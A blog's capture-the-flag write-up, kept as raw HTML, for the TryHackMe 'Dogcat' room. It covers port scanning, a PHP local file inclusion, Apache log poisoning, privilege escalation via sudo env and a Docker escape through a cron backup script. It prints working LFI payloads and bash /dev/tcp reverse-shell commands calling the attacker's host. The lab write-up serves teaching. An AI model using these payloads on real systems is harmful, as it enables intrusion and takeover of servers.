<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 31/10/2022 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Dogcat
I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/dogcat/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - Dogcat"><meta property="og:description" content="ðŸ“† 31/10/2022 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Dogcat
I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/dogcat/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - Dogcat"><meta name=twitter:description content="ðŸ“† 31/10/2022 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Dogcat
I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - Dogcat","item":"https://geobour98.com/write-ups/thm/dogcat/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Dogcat","name":"TryHackMe - Dogcat","description":"ðŸ“† 31/10/2022 - geobour98 âŒš 7 min\nIntroduction This is a TryHackMe room which can be found at: Dogcat\nI made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10.","keywords":[],"articleBody":"ðŸ“† 31/10/2022 - geobour98 âŒš 7 min\nIntroduction This is a TryHackMe room which can be found at: Dogcat\nI made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.202.202  geobour98@kali:~$ nmap -p- -T4 -v 10.10.202.202 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 09:27 EET Initiating Ping Scan at 09:27 Scanning 10.10.202.202 [2 ports] Completed Ping Scan at 09:27, 0.08s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 09:27 Completed Parallel DNS resolution of 1 host. at 09:27, 0.00s elapsed Initiating Connect Scan at 09:27 Scanning 10.10.202.202 (10.10.202.202) [65535 ports] Discovered open port 80/tcp on 10.10.202.202 Discovered open port 22/tcp on 10.10.202.202 Completed Connect Scan at 09:28, 58.93s elapsed (65535 total ports) Nmap scan report for 10.10.202.202 (10.10.202.202) Host is up (0.074s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 49592/tcp filtered unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 59.04 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80,49592 -v 10.10.202.202  geobour98@kali:~$ sudo nmap -A -sC -p 22,80,49592 -v 10.10.202.202 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 09:29 EET NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Initiating Ping Scan at 09:29 Scanning 10.10.202.202 [4 ports] Completed Ping Scan at 09:29, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 09:29 Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed Initiating SYN Stealth Scan at 09:29 Scanning 10.10.202.202 (10.10.202.202) [3 ports] Discovered open port 22/tcp on 10.10.202.202 Discovered open port 80/tcp on 10.10.202.202 Completed SYN Stealth Scan at 09:29, 0.10s elapsed (3 total ports) Initiating Service scan at 09:29 Scanning 2 services on 10.10.202.202 (10.10.202.202) Completed Service scan at 09:29, 6.15s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.202.202 (10.10.202.202)  Retrying OS detection (try #2) against 10.10.202.202 (10.10.202.202) Retrying OS detection (try #3) against 10.10.202.202 (10.10.202.202) Retrying OS detection (try #4) against 10.10.202.202 (10.10.202.202) Retrying OS detection (try #5) against 10.10.202.202 (10.10.202.202) Initiating Traceroute at 09:29 Completed Traceroute at 09:29, 0.09s elapsed Initiating Parallel DNS resolution of 1 host. at 09:29 Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed NSE: Script scanning 10.10.202.202. Initiating NSE at 09:29 Completed NSE at 09:29, 3.97s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.32s elapsed Initiating NSE at 09:29 Completed NSE at 09:29, 0.00s elapsed Nmap scan report for 10.10.202.202 (10.10.202.202) Host is up (0.100s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2431192ab1971a044e2c36ac840a7587 (RSA) | 256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA) |_ 256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: dogcat |_http-server-header: Apache/2.4.38 (Debian) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 49592/tcp closed unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). Navigate to port 80, and notice the URLs for dogs images: http://10.10.202.202/?view=dog and cats images: http://10.10.202.202/?view=cat. Also, from Wappalyzer we identify that PHP is used.\n  Command: gobuster dir -u http://10.10.202.202/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40  geobour98@kali:~$ gobuster dir -u http://10.10.202.202/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 =============================================================== Gobuster v3.2.0-dev by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.202.202/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.2.0-dev [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/10/30 09:43:01 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 418] /cat.php (Status: 200) [Size: 26] /flag.php (Status: 200) [Size: 0] /cats (Status: 301) [Size: 309] [-- http://10.10.202.202/cats/] /dogs (Status: 301) [Size: 309] [-- http://10.10.202.202/dogs/] /dog.php (Status: 200) [Size: 26] /server-status (Status: 403) [Size: 276] Progress: 441122 / 441124 (100.00%)=============================================================== 2022/10/30 09:59:03 Finished =============================================================== After poking around we identified that either the string dog or cat must be in the value of the view parameter. If we navigate to the URL: http://10.10.202.202/?view=dog1 we get the following warnings:\nHere you go! Warning: include(dog1.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24  Warning: include(): Failed opening 'dog1.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24 These warnings reveal that include_path is used, which probably checks for the strings dog or cat.\nExploitation So, it is possible for an LFI to be there, so we will try some payloads from: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion The successful payload is: php://filter/convert.base64-encode/resource=, so the URL becomes: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog resulting to: Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K  Flag 1 We have also found flag.php from gobuster so we can read the 1st flag by navigating to: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../flag. The output is: Here you go![REDACTED], which we can decode from base64. We can navigate to: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../index in order to view the source code of index.php (if we first decode it from base64):\n html  head  titledogcattitle  link rel=\"stylesheet\" type=\"text/css\" href=\"/style.css\" head  body  h1dogcath1  ia gallery of various dogs or catsi   div  h2What would you like to see?h2  a href=\"/?view=dog\"button id=\"dog\"A dogbuttona a href=\"/?view=cat\"button id=\"cat\"A catbuttonabr  function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php'; if(isset($_GET['view'])) { if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) { echo 'Here you go!'; include $_GET['view'] . $ext; } else { echo 'Sorry, only dogs or cats are allowed.'; } } ?  div body html We notice that index.php also checks for the ext parameter and if itâ€™s missing, it appends .php. So, we can read now the /var/log/apache2/access.log on the URL: http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../../../../var/log/apache2/access.log\u0026ext (again after decoding from base64). So, we can perform log poisoning in order to execute commands.\ngeobour98@kali:~$ nc -vn 10.10.202.202 80 (UNKNOWN) [10.10.202.202] 80 (http) open GET /($_GET['cmd']); ? HTTP/1.1 400 Bad Request Date: Sun, 30 Oct 2022 08:30:36 GMT Server: Apache/2.4.38 (Debian) Content-Length: 302 Connection: close Content-Type: text/html; charset=iso-8859-1  \"-//IETF//DTD HTML 2.0//EN\"  400 Bad Request  Bad Request Your browser sent a request that this server could not understand.\n\n Apache/2.4.38 (Debian) Server at 172.17.0.2 Port 80  The response has 400 HTTP status code but we can verify that the log poisoning was successful by navigating to: http://10.10.202.202/?view=.dog/../../../../var/log/apache2/access.log\u0026cmd=id\u0026ext The output is: uid=33(www-data) gid=33(www-data) groups=33(www-data), so we now can get a reverse shell through Burp Suite. Refresh this page: http://10.10.202.202/?view=.dog/../../../../var/log/apache2/access.log\u0026cmd=id\u0026ext and Intercept it with Burp. Then replace the id command with bash -c 'exec bash -i \u0026/dev/tcp/10.8.16.74/443  but URL-encoded. So the request should look like this:\nGET /?view=.dog/../../../../var/log/apache2/access.log\u0026cmd=bash+-c+'exec+bash+-i+%26/dev/tcp/10.8.16.74/443+\u0026ext HTTP/1.1 Host: 10.10.202.202 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Then, open a netcat listener and we have a reverse shell as www-data.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.16.74] from (UNKNOWN) [10.10.202.202] 54374 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@85e25e675ab4:/var/www/html$ whoami www-data Privilege Escalation After executing the command: sudo -l we see that we can execute /usr/bin/env as root without being asked for root password. We can use the following command to become root: sudo env /bin/sh found on: https://gtfobins.github.io/gtfobins/env/#sudo\nwww-data@85e25e675ab4:/var/www/html$ sudo -l sudo -l Matching Defaults entries for www-data on 85e25e675ab4:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin  User www-data may run the following commands on 85e25e675ab4:  (root) NOPASSWD: /usr/bin/env www-data@85e25e675ab4:/var/www/html$ sudo env /bin/sh sudo env /bin/sh id uid=0(root) gid=0(root) groups=0(root) Flag 2 The 2nd flag can be found in: /var/www/flag2_QMW7JvaY2LvK.txt:\ncd /var/www cat flag2_QMW7JvaY2LvK.txt [REDACTED] Flag 3 The 3rd flag can be found in: /root/flag3.txt:\ncd /root cat flag3.txt [REDACTED] Flag 4 If we navigate to / we see the file .dockerenv meaning that we are in Docker container. There is an interesting file backup.sh in /opt/backups/, which should be executed as a Cron job on the Host machine, because it is executing a tar command. So, we can modify backup.sh in order to get a reverse shell from the Host.\necho \"bash -c 'exec bash -i \u0026/dev/tcp/10.8.16.74/443   backup.sh cat backup.sh bash -c 'exec bash -i \u0026/dev/tcp/10.8.16.74/443  Open a netcat listener on 443 port and wait for the connection.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.16.74] from (UNKNOWN) [10.10.202.202] 38480 bash: cannot set terminal process group (3679): Inappropriate ioctl for device bash: no job control in this shell root@dogcat:~# id id uid=0(root) gid=0(root) groups=0(root) root@dogcat:~# cat flag4.txt cat flag4.txt [REDACTED] Now are the root user on the Host machine.\nProof of Concept (PoC image): linux web lfi php log-poisoning sudo env gtfobins docker container  ","wordCount":"1486","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/dogcat/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - Dogcat</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 31/10/2022 - geobour98<br>âŒš 7 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/dogcat target=_blank style=color:#e30f0f>Dogcat</a></p><p>I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 10.10.202.202</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 10.10.202.202
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-10-30 09:27 EET
</span></span><span style=display:flex><span>Initiating Ping Scan at 09:27
</span></span><span style=display:flex><span>Scanning 10.10.202.202 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 09:27, 0.08s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 09:27
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 09:27, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 09:27
</span></span><span style=display:flex><span>Scanning 10.10.202.202 <span style=color:#f92672>(</span>10.10.202.202<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.202.202
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.202.202
</span></span><span style=display:flex><span>Completed Connect Scan at 09:28, 58.93s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.202.202 <span style=color:#f92672>(</span>10.10.202.202<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.074s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65532</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT      STATE    SERVICE
</span></span><span style=display:flex><span>22/tcp    open     ssh
</span></span><span style=display:flex><span>80/tcp    open     http
</span></span><span style=display:flex><span>49592/tcp filtered unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 59.04 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80,49592 -v 10.10.202.202</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80,49592 -v 10.10.202.202 
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-10-30 09:29 EET                                                                        
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.                                                                                                  
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.                                                                                                              
</span></span><span style=display:flex><span>Initiating NSE at 09:29                                                                                                                
</span></span><span style=display:flex><span>Completed NSE at 09:29, 0.00s elapsed                                                                                                  
</span></span><span style=display:flex><span>Initiating NSE at 09:29                                                                                                                
</span></span><span style=display:flex><span>Completed NSE at 09:29, 0.00s elapsed                                                                                                  
</span></span><span style=display:flex><span>Initiating NSE at 09:29                                                                                                                
</span></span><span style=display:flex><span>Completed NSE at 09:29, 0.00s elapsed                                                                                                  
</span></span><span style=display:flex><span>Initiating Ping Scan at 09:29                                                                                                          
</span></span><span style=display:flex><span>Scanning 10.10.202.202 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>                                                                                                         
</span></span><span style=display:flex><span>Completed Ping Scan at 09:29, 0.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>                                                                            
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 09:29                                                                                 
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 09:29, 0.00s elapsed                                                                   
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 09:29                                                                                                   
</span></span><span style=display:flex><span>Scanning 10.10.202.202 <span style=color:#f92672>(</span>10.10.202.202<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>3</span> ports<span style=color:#f92672>]</span>                                                                                           
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.202.202                                                                                             
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.202.202                                                                                             
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 09:29, 0.10s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>3</span> total ports<span style=color:#f92672>)</span>                                                                     
</span></span><span style=display:flex><span>Initiating Service scan at 09:29                                                                                                       
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 10.10.202.202 <span style=color:#f92672>(</span>10.10.202.202<span style=color:#f92672>)</span>                                                                                       
</span></span><span style=display:flex><span>Completed Service scan at 09:29, 6.15s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>                                                                  
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 10.10.202.202 (10.10.202.202)                                                                     </span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 10.10.202.202 (10.10.202.202)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#3) against 10.10.202.202 (10.10.202.202)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#4) against 10.10.202.202 (10.10.202.202)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#5) against 10.10.202.202 (10.10.202.202)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 09:29
</span></span><span style=display:flex><span>Completed Traceroute at 09:29, 0.09s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 09:29
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 09:29, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 10.10.202.202. 
</span></span><span style=display:flex><span>Initiating NSE at 09:29
</span></span><span style=display:flex><span>Completed NSE at 09:29, 3.97s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 09:29
</span></span><span style=display:flex><span>Completed NSE at 09:29, 0.32s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 09:29
</span></span><span style=display:flex><span>Completed NSE at 09:29, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.202.202 <span style=color:#f92672>(</span>10.10.202.202<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.100s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE  SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 2431192ab1971a044e2c36ac840a7587 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 213d461893aaf9e7c9b54c0f160b71e1 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> c1fb7d732b574a8bdcd76f49bb3bd020 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp    open   http    Apache httpd 2.4.38 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: dogcat
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style=display:flex><span>49592/tcp closed unknown
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
</span></span></code></pre></div><p>Navigate to port <code>80</code>, and notice the URLs for dogs images: <code>http://10.10.202.202/?view=dog</code> and cats images: <code>http://10.10.202.202/?view=cat</code>.<br>Also, from <code>Wappalyzer</code> we identify that <code>PHP</code> is used.</p><ul><li>Command: <code>gobuster dir -u http://10.10.202.202/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://10.10.202.202/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.2.0-dev
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.202.202/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
